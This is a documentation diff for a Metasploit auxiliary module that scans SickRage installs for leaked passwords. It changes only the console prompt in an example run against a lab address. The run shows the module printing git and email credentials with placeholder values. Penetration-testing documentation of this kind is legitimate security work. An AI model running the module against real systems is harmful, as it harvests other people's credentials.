@@ -45,10 +45,10 @@
 ### Tested on Windows 7 x86
 
   ```
-  msf5 > use auxiliary/scanner/http/http_sickrage_password_leak
-  msf5 auxiliary(scanner/http/http_sickrage_password_leak) > set RHOSTS 192.168.37.130
+  msf > use auxiliary/scanner/http/http_sickrage_password_leak
+  msf auxiliary(scanner/http/http_sickrage_password_leak) > set RHOSTS 192.168.37.130
   RHOSTS => 192.168.37.130
-  msf5 auxiliary(scanner/http/http_sickrage_password_leak) > run
+  msf auxiliary(scanner/http/http_sickrage_password_leak) > run
 
   [+] git username: myUsername
   [+] git password: myPassword
@@ -61,5 +61,5 @@
   [+] Email username: sickrage@sickrage.com
   [+] Email password: sickragepass
   [*] Auxiliary module execution completed
-  msf5 auxiliary(scanner/http/http_sickrage_password_leak) >
+  msf auxiliary(scanner/http/http_sickrage_password_leak) >
   ```
